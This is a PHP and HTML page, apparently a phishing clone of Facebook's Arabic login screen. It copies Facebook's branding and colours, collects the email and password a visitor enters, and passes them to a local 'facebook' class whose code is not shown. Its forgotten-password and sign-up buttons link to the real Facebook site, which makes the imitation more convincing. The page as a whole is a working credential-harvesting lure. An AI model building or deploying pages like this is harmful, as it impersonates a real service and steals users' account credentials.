<?php

include 'controller/facebook.php';


?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
  <style>
    
    body{
        
        background-color:#F0F2F5;
    }
    img{
        width:50px;
        height:30px;
    }h6{
        color:#fff;
        padding-left:10px;
    }h3{
        padding-top:25px;
        text-align:center;
    }.text{
        width:450px;
     height:450px;
        background-color:#FFFFFF;
        margin: auto;
        margin-top:40px ;
        direction:rtl;

    }input{
 height:50px;
 border-radius:30px;
    }a p{
        padding-top:10px;
        text-align:center;
    }
  </style>
</head>
<body>

<nav class="navbar navbar-expand-sm navbar-dark "style="background-color:#3A589E">
  <div class="container-fluid">
  <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#mynavbar">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="mynavbar">
      <ul class="navbar-nav me-auto">
        <li class="nav-item">
          <a class="nav-link" href="javascript:void(0)"><h6>تسجيل</h6></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="logout.php"><h6>خروج</h6></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="javascript:void(0)"><h6>دخول</h6></a>
        </li>
      
      </ul>
      <a class="navbar-brand" href="javascript:void(0)">FACEBOOK</a>
  
    </div>
  </div>
</nav>
<!-- end navbar -->
<?php
if(isset($_POST['submit']))
{
    
    $email=$_REQUEST['email'];
    $password=$_REQUEST['password'];


    if(empty($email) AND empty($password))
{
  echo '<div class="alert alert-info" role="alert">
برجاء ادخال اميل الفيس وكلمه السر 
  </div>';
 
}
else{
  $x=new facebook();
   $x->register($email,$password);
 
}

}
?>
<div class="container">

    <div class="row">
        <h3>Facebook</h2>
       
        <div class="text">
        <form method="post">
  <div class="">
    <label for="email" class="form-label"></label>
    <input type="text" class="form-control" id="email" placeholder=" البريد الالكترواني او الهاتف " name="email">
  </div>
  <div class="">
    <label for="pwd" class="form-label"></label>
    <input type="password" class="form-control" id="pwd" placeholder="الرقم السري" name="password">
  </div>
  <br>

  
<button class="btn" name="submit" style="background-color: #166FE5;
    border: none;
    border-radius: 6px;
    font-size: 21px;
    line-height: 48px;
    padding: 0 16px;
    width: 100%;" >دخول</button>

</form>
<a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"><p>هل نسيت كلمة السر؟</p></a>
<br>
<hr>
<a href="https://web.facebook.com/r.php?locale=ar_AR&display=page">
<button class="btn "style="background-color:#42b72a;border: none;
    border-radius: 6px;
    font-size: 18px;
    line-height: 48px;
    padding: 0 16px;margin-right:65px" name="submit">انشاء حساب جديد</button></a>
        </div>
    </div>
</div>


</body>
</html>

